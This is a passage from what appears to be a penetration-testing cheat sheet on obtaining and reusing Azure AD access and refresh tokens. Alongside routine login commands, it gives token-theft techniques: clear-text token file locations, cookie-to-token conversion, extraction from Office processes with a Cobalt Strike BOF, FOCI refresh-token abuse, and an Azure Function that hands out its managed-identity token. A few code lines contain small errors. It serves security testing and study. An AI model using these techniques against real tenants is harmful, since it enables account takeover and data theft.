<tr>
<td>Microsoft Azure PowerShell</td>
<td>1950a258-227b-4e31-a9cf-717495945fc2</td>
</tr>
<tr>
<td>Microsoft Azure CLI</td>
<td>04b07795-8ddb-461a-bbee-02f9e1bf7b46</td>
</tr>
<tr>
<td>Portail Azure</td>
<td>c44b4083-3bb0-49c1-b47d-974e53cbdf3c</td>
</tr>
</tbody>
</table>
<p>After a successfull authentication, you will get an access token.</p>
<h3 id="az-cli">az cli</h3>
<ul>
<li>Login with credentials
    <div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">az</span> <span class="n">login</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span>
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">az</span> <span class="n">login</span> <span class="p">-</span><span class="n">-service-principal</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">app-id</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-tenant</span> <span class="p">&lt;</span><span class="n">tenant-id</span><span class="p">&gt;</span>
</code></pre></div></li>
<li>Get token
    <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">az</span> <span class="n">account</span> <span class="nb">get-access</span><span class="n">-token</span>
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">az</span> <span class="n">account</span> <span class="nb">get-access</span><span class="n">-token</span> <span class="p">-</span><span class="n">-resource-type</span> <span class="n">aad-graph</span>
</code></pre></div></li>
</ul>
<p>Whoami equivalent: <code>az ad signed-in-user show</code></p>
<h3 id="azure-ad-powershell">Azure AD Powershell</h3>
<ul>
<li>Login with credentials
    <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nv">$passwd</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">&quot;&lt;PASSWORD&gt;&quot;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nv">$creds</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s2">&quot;test@&lt;TENANT NAME&gt;.onmicrosoft.com&quot;</span><span class="p">,</span> <span class="nv">$passwd</span><span class="p">)</span>
<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nb">Connect-AzureAD</span> <span class="n">-Credential</span> <span class="nv">$creds</span>
</code></pre></div></li>
</ul>
<h3 id="az-powershell">Az Powershell</h3>
<ul>
<li>Login with credentials
    <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nv">$passwd</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">&quot;&lt;PASSWORD&gt;&quot;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nv">$creds</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="p">(</span><span class="s2">&quot;&lt;USERNAME&gt;@&lt;TENANT NAME&gt;.onmicrosoft.com&quot;</span><span class="p">,</span> <span class="nv">$passwd</span><span class="p">)</span>
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nb">Connect-AzAccount</span> <span class="n">-Credential</span> <span class="nv">$creds</span>
</code></pre></div></li>
<li>Login with service principal secret
    <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;&lt;SECRET&gt;&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nv">$creds</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;&lt;APP-ID&gt;&#39;</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="nb">Connect-AzAccount</span> <span class="n">-ServicePrincipal</span> <span class="n">-Credential</span> <span class="nv">$creds</span> <span class="n">-Tenant</span> <span class="n">29sd87e56-a192-a934-bca3</span><span class="p">-</span><span class="n">0398471ab4e7d</span>
</code></pre></div></li>
<li>Get token
    <div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="p">(</span><span class="nb">Get-AzAccessToken</span> <span class="n">-ResourceUrl</span> <span class="n">https</span><span class="p">://</span><span class="n">graph</span><span class="p">.</span><span class="n">microsoft</span><span class="p">.</span><span class="n">com</span><span class="p">).</span><span class="n">Token</span>
<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nb">Get-AzAccessToken</span> <span class="n">-ResourceTypeName</span> <span class="n">MSGraph</span>
</code></pre></div></li>
</ul>
<h3 id="microsoft-graph-powershell">Microsoft Graph Powershell</h3>
<ul>
<li>Login with credentials
    <div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">Connect-MgGraph</span>
<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nb">Connect-MgGraph</span> <span class="n">-Scopes</span> <span class="s2">&quot;User.Read.All&quot;</span><span class="p">,</span> <span class="s2">&quot;Group.ReadWrite.All&quot;</span>
</code></pre></div></li>
<li>Login with device code flow
    <div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">Connect-MgGraph</span> <span class="n">-Scopes</span> <span class="s2">&quot;User.Read.All&quot;</span><span class="p">,</span> <span class="s2">&quot;Group.ReadWrite.All&quot;</span> <span class="n">-UseDeviceAuthentication</span>
</code></pre></div></li>
</ul>
<p>Whoami equivalent: <code>Get-MgContext</code></p>
<h3 id="external-http-api">External HTTP API</h3>
<ul>
<li>Login with credentials
    <div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>
</code></pre></div></li>
<li>
<p>Login with device code flow
    <div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c"># paste this in a PowerShell console</span>
<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nv">$body</span> <span class="p">=</span> <span class="p">@{</span>
<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>    <span class="s2">&quot;client_id&quot;</span> <span class="p">=</span>     <span class="s2">&quot;1950a258-227b-4e31-a9cf-717495945fc2&quot;</span><span class="p">!</span>
<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>    <span class="s2">&quot;resource&quot;</span> <span class="p">=</span>      <span class="s2">&quot;https://graph.microsoft.com&quot;</span>
<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="p">}</span>
<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="nv">$UserAgent</span> <span class="p">=</span> <span class="s2">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36&quot;</span>
<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="nv">$Headers</span><span class="p">=@{}</span>
<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="nv">$Headers</span><span class="p">[</span><span class="s2">&quot;User-Agent&quot;</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$UserAgent</span>
<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="nv">$authResponse</span> <span class="p">=</span> <span class="nb">Invoke-RestMethod</span> <span class="p">`</span>
<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>    <span class="n">-UseBasicParsing</span> <span class="p">`</span>
<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>    <span class="n">-Method</span> <span class="n">Post</span> <span class="p">`</span>
<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>    <span class="n">-Uri</span> <span class="s2">&quot;https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0&quot;</span> <span class="p">`</span>
<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>    <span class="n">-Headers</span> <span class="nv">$Headers</span> <span class="p">`</span>
<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>    <span class="n">-Body</span> <span class="nv">$body</span>
<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="nv">$authResponse</span>
<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>
<a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a><span class="c"># then browse to https://microsoft.com/devicelogin and use the device_code</span>
<a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a><span class="c"># finally execute this command to ask for tokens</span>
<a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a><span class="nv">$body</span><span class="p">=@{</span>
<a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a>    <span class="s2">&quot;client_id&quot;</span> <span class="p">=</span>  <span class="s2">&quot;1950a258-227b-4e31-a9cf-717495945fc2&quot;</span>
<a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a>    <span class="s2">&quot;grant_type&quot;</span> <span class="p">=</span> <span class="s2">&quot;urn:ietf:params:oauth:grant-type:device_code&quot;</span>
<a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>    <span class="s2">&quot;code&quot;</span> <span class="p">=</span>       <span class="nv">$authResponse</span><span class="p">.</span><span class="n">device_code</span>
<a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a><span class="p">}</span>
<a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a><span class="nv">$Tokens</span> <span class="p">=</span> <span class="nb">Invoke-RestMethod</span> <span class="p">`</span>
<a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a>    <span class="n">-UseBasicParsing</span> <span class="p">`</span>
<a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a>    <span class="n">-Method</span> <span class="n">Post</span> <span class="p">`</span>
<a id="__codelineno-9-27" name="__codelineno-9-27" href="#__codelineno-9-27"></a>    <span class="n">-Uri</span> <span class="s2">&quot;https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0&quot;</span> <span class="p">`</span>
<a id="__codelineno-9-28" name="__codelineno-9-28" href="#__codelineno-9-28"></a>    <span class="n">-Headers</span> <span class="nv">$Headers</span> <span class="p">`</span>
<a id="__codelineno-9-29" name="__codelineno-9-29" href="#__codelineno-9-29"></a>    <span class="n">-Body</span> <span class="nv">$body</span>
<a id="__codelineno-9-30" name="__codelineno-9-30" href="#__codelineno-9-30"></a><span class="nv">$Tokens</span>
</code></pre></div></p>
</li>
<li>
<p>Request an access token using a <strong>service principal password</strong>
    <div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nb">curl </span><span class="p">-</span><span class="n">-location</span> <span class="p">-</span><span class="n">-request</span> <span class="n">POST</span> <span class="s1">&#39;https://login.microsoftonline.com/&lt;tenant-name&gt;/oauth2/v2.0/token&#39;</span> <span class="p">\</span>
<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="p">-</span><span class="n">-header</span> <span class="s1">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> <span class="p">\</span>
<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="p">-</span><span class="n">-data-urlencode</span> <span class="s1">&#39;client_id=&lt;client-id&gt;&#39;</span> <span class="p">\</span>
<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="p">-</span><span class="n">-data-urlencode</span> <span class="s1">&#39;scope=https://graph.microsoft.com/.default&#39;</span> <span class="p">\</span>
<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="p">-</span><span class="n">-data-urlencode</span> <span class="s1">&#39;client_secret=&lt;client-secret&gt;&#39;</span> <span class="p">\</span>
<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="p">-</span><span class="n">-data-urlencode</span> <span class="s1">&#39;grant_type=client_credentials&#39;</span>
</code></pre></div></p>
</li>
</ul>
<h3 id="internal-http-api">Internal HTTP API</h3>
<blockquote>
<p><strong>MSI_ENDPOINT</strong> is an alias for <strong>IDENTITY_ENDPOINT</strong>, and <strong>MSI_SECRET</strong> is an alias for <strong>IDENTITY_HEADER</strong>.</p>
</blockquote>
<p>Find <code>IDENTITY_HEADER</code> and <code>IDENTITY_ENDPOINT</code> from the environment variables: <code>env</code></p>
<p>Most of the time, you want a token for one of these resources: </p>
<ul>
<li>https://graph.microsoft.com</li>
<li>https://management.azure.com</li>
<li>https://storage.azure.com</li>
<li>
<p>https://vault.azure.net</p>
</li>
<li>
<p>PowerShell
    <div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">curl </span><span class="s2">&quot;$IDENTITY_ENDPOINT?resource=https://management.azure.com&amp;api-version=2017-09-01&quot;</span> <span class="n">-H</span> <span class="n">secret</span><span class="p">:</span><span class="nv">$IDENTITY_HEADER</span>
<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="nb">curl </span><span class="s2">&quot;$IDENTITY_ENDPOINT?resource=https://vault.azure.net&amp;api-version=2017-09-01&quot;</span> <span class="n">-H</span> <span class="n">secret</span><span class="p">:</span><span class="nv">$IDENTITY_HEADER</span>
</code></pre></div></p>
</li>
<li>Azure Function (Python)
    <div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="kn">import</span> <span class="nn">logging</span><span class="o">,</span> <span class="nn">os</span>
<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="kn">import</span> <span class="nn">azure.functions</span> <span class="k">as</span> <span class="nn">func</span>
<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">req</span><span class="p">:</span> <span class="n">func</span><span class="o">.</span><span class="n">HttpRequest</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">func</span><span class="o">.</span><span class="n">HttpResponse</span><span class="p">:</span>
<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Python HTTP trigger function processed a request.&#39;</span><span class="p">)</span>
<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>    <span class="n">IDENTITY_ENDPOINT</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;IDENTITY_ENDPOINT&#39;</span><span class="p">]</span>
<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>    <span class="n">IDENTITY_HEADER</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;IDENTITY_HEADER&#39;</span><span class="p">]</span>
<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>    <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;curl &quot;</span><span class="si">%s</span><span class="s1">?resource=https://management.azure.com&amp;apiversion=2017-09-01&quot; -H secret:</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">IDENTITY_ENDPOINT</span><span class="p">,</span> <span class="n">IDENTITY_HEADER</span><span class="p">)</span>
<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>    <span class="n">val</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>    <span class="k">return</span> <span class="n">func</span><span class="o">.</span><span class="n">HttpResponse</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="n">status_code</span><span class="o">=</span><span class="mi">200</span><span class="p">)</span>
</code></pre></div></li>
</ul>
<h2 id="access-token">Access Token</h2>
<p>An access token is a type of security token issued by Azure Active Directory (Azure AD) that grants a user or application permission to access resources. These resources could be anything from APIs, web applications, data stored in Azure, or other services that are integrated with Azure AD for authentication and authorization.</p>
<p>Decode access tokens: <a href="https://jwt.ms/">jwt.ms</a></p>
<ul>
<li>Use the access token with <strong>MgGraph</strong>
    <div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c"># use the jwt</span>
<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="nv">$token</span> <span class="p">=</span> <span class="s2">&quot;eyJ0eXAiO...&quot;</span>
<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="nv">$secure</span> <span class="p">=</span> <span class="nv">$token</span> <span class="p">|</span> <span class="nb">ConvertTo-SecureString</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="nb">Connect-MgGraph</span> <span class="n">-AccessToken</span> <span class="nv">$secure</span>
</code></pre></div></li>
<li>Use the access token with <strong>AzureAD</strong>
    <div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">Connect-AzureAD</span> <span class="n">-AadAccessToken</span> <span class="p">&lt;</span><span class="n">access-token</span><span class="p">&gt;</span> <span class="n">-TenantId</span> <span class="p">&lt;</span><span class="n">tenant-id</span><span class="p">&gt;</span> <span class="n">-AccountId</span> <span class="p">&lt;</span><span class="n">account-id</span><span class="p">&gt;</span>
</code></pre></div></li>
<li>Use the access token with <strong>Az Powershell</strong>
    <div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="nb">Connect-AzAccount</span> <span class="n">-AccessToken</span> <span class="p">&lt;</span><span class="n">access-token</span><span class="p">&gt;</span> <span class="n">-AccountId</span> <span class="p">&lt;</span><span class="n">account-id</span><span class="p">&gt;</span>
<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="nb">Connect-AzAccount</span> <span class="n">-AccessToken</span> <span class="p">&lt;</span><span class="n">access-token</span><span class="p">&gt;</span> <span class="n">-GraphAccessToken</span> <span class="p">&lt;</span><span class="n">graph-access-token</span><span class="p">&gt;</span> <span class="n">-AccountId</span> <span class="p">&lt;</span><span class="n">account-id</span><span class="p">&gt;</span>
</code></pre></div></li>
<li>Use the access token with the <strong>API</strong>
    <div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="nv">$Token</span> <span class="p">=</span> <span class="s1">&#39;eyJ0eX..&#39;</span>
<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="nv">$URI</span> <span class="p">=</span> <span class="s1">&#39;https://management.azure.com/subscriptions?api-version=2020-01-01&#39;</span>
<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="c"># $URI = &#39;https://graph.microsoft.com/v1.0/applications&#39;</span>
<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="nv">$RequestParams</span> <span class="p">=</span> <span class="p">@{</span>
<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>    <span class="n">Method</span> <span class="p">=</span> <span class="s1">&#39;GET&#39;</span>
<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>    <span class="n">Uri</span> <span class="p">=</span> <span class="nv">$URI</span>
<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>    <span class="n">Headers</span> <span class="p">=</span> <span class="p">@{</span>
<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>        <span class="s1">&#39;Authorization&#39;</span> <span class="p">=</span> <span class="s2">&quot;Bearer $Token&quot;</span>
<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>    <span class="p">}</span>
<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="p">}</span>
<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="p">(</span><span class="nb">Invoke-RestMethod</span> <span class="nv">@RequestParams</span><span class="p">).</span><span class="n">value</span> 
</code></pre></div></li>
</ul>
<h3 id="access-token-locations">Access Token Locations</h3>
<p>Tokens are stored by default on the disk in you use <strong>Azure Cloud Shell</strong>. They canbe extracted by dumping the content of the storage account.</p>
<ul>
<li>
<p>az cli</p>
<ul>
<li>az cli stores access tokens in clear text in <strong>accessTokens.json</strong> in the directory <code>C:\Users\&lt;username&gt;\.Azure</code></li>
<li>azureProfile.json in the same directory contains information about subscriptions.</li>
</ul>
</li>
<li>
<p>Az PowerShell</p>
<ul>
<li>Az PowerShell stores access tokens in clear text in <strong>TokenCache.dat</strong> in the directory <code>C:\Users\&lt;username&gt;\.Azure</code></li>
<li>It also stores <strong>ServicePrincipalSecret</strong> in clear-text in <strong>AzureRmContext.json</strong> </li>
<li>Users can save tokens using <code>Save-AzContext</code></li>
</ul>
</li>
</ul>
<h2 id="refresh-token">Refresh Token</h2>
<ul>
<li>Requesting a token using credentials
    <div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">TODO</span>
</code></pre></div></li>
</ul>
<h3 id="get-a-refresh-token-from-estsauth-cookie">Get a Refresh Token from ESTSAuth Cookie</h3>
<p><code>ESTSAuthPersistent</code> is only useful when a CA policy actually grants a persistent session. Otherwise, you should use <code>ESTSAuth</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">TokenTacticsV2</span><span class="p">&gt;</span> <span class="nb">Get-AzureTokenFromESTSCookie</span> <span class="n">-ESTSAuthCookie</span> <span class="s2">&quot;0.AS8&quot;</span>
<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="n">TokenTacticsV2</span><span class="p">&gt;</span> <span class="nb">Get-AzureTokenFromESTSCookie</span> <span class="n">-Client</span> <span class="n">MSTeams</span> <span class="n">-ESTSAuthCookie</span> <span class="s2">&quot;0.AbcAp..&quot;</span>
</code></pre></div>
<h3 id="get-a-refresh-token-from-office-process">Get a Refresh Token from Office process</h3>
<ul>
<li><a href="https://github.com/trustedsec/CS-Remote-OPs-BOF">trustedsec/CS-Remote-OPs-BOF</a>
<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="n">load</span> <span class="n">bofloader</span>
<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="n">execute_bof</span> <span class="p">/</span><span class="n">opt</span><span class="p">/</span><span class="n">CS-Remote-OPs-BOF</span><span class="p">/</span><span class="n">Remote</span><span class="p">/</span><span class="n">office_tokens</span><span class="p">/</span><span class="n">office_tokens</span><span class="p">.</span><span class="n">x64</span><span class="p">.</span><span class="n">o</span> <span class="p">-</span><span class="n">-format-string</span> <span class="n">i</span>  <span class="n">7324</span>
</code></pre></div></li>
</ul>
<h2 id="foci-refresh-token">FOCI Refresh Token</h2>
<p>FOCI allows applications registered with Azure AD to share tokens, minimizing the need for separate authentications when a user accesses multiple applications that are part of the same "family."</p>
<ul>
<li><a href="https://github.com/secureworks/family-of-client-ids-research/blob/main/scope-map.txt">secureworks/family-of-client-ids-research/</a> - Research into Undocumented Behavior of Azure AD Refresh Tokens</li>
</ul>
<p><strong>Generate tokens</strong>   </p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">roadtx</span> <span class="n">gettokens</span> <span class="p">-</span><span class="n">-refresh-token</span> <span class="p">&lt;</span><span class="n">refresh-token</span><span class="p">&gt;</span> <span class="n">-c</span> <span class="p">&lt;</span><span class="n">foci-id</span><span class="p">&gt;</span> <span class="n">-r</span> <span class="n">https</span><span class="p">://</span><span class="n">graph</span><span class="p">.</span><span class="n">microsoft</span><span class="p">.</span><span class="n">com</span> 
<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="n">roadtx</span> <span class="n">gettokens</span> <span class="p">-</span><span class="n">-refresh-token</span> <span class="p">&lt;</span><span class="n">refresh-token</span><span class="p">&gt;</span> <span class="n">-c</span> <span class="n">04b07795</span><span class="p">-</span><span class="n">8ddb</span><span class="p">-</span><span class="n">461a-bbee</span><span class="p">-</span><span class="n">02f9e1bf7b46</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>scope               resource                                client                              
<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>.default            04b07795-8ddb-461a-bbee-02f9e1bf7b46    04b07795-8ddb-461a-bbee-02f9e1bf7b46
<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>                    1950a258-227b-4e31-a9cf-717495945fc2    1950a258-227b-4e31-a9cf-717495945fc2
<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>                    https://graph.microsoft.com             00b41c95-dab0-4487-9791-b9d2c32c80f2
<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46
<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>                    https://graph.windows.net               00b41c95-dab0-4487-9791-b9d2c32c80f2
<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46
<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>                    https://outlook.office.com              00b41c95-dab0-4487-9791-b9d2c32c80f2
<a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46
<a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>Files.Read.All      d3590ed6-52b3-4102-aeff-aad2292ab01c    d3590ed6-52b3-4102-aeff-aad2292ab01c
<a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>                    https://graph.microsoft.com             3590ed6-52b3-4102-aeff-aad2292ab01c
<a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>                    https://outlook.office.com              1fec8e78-bce4-4aaf-ab1b-5451cc387264
<a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>Mail.ReadWrite.All  https://graph.microsoft.com             00b41c95-dab0-4487-9791-b9d2c32c80f2
<a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a>                    https://outlook.office.com              00b41c95-dab0-4487-9791-b9d2c32c80f2
<a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a>                    https://outlook.office365.com           00b41c95-dab0-4487-9791-b9d2c32c80f2
</code></pre></div>
<h2 id="primary-refresh-token">Primary Refresh Token</h2>
<p>A Primary Refresh Token (PRT) is a key artifact in the authentication and identity management process in Microsoft's Azure AD (Azure Active Directory) environment. The PRT is primarily used for maintaining a seamless sign-in experience on devices. </p>
<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> A PRT is valid for 90 days and is continuously renewed as long as the device is in use. However, it's only valid for 14 days if the device is not in use. </p>
<ul>
<li>Use PRT token
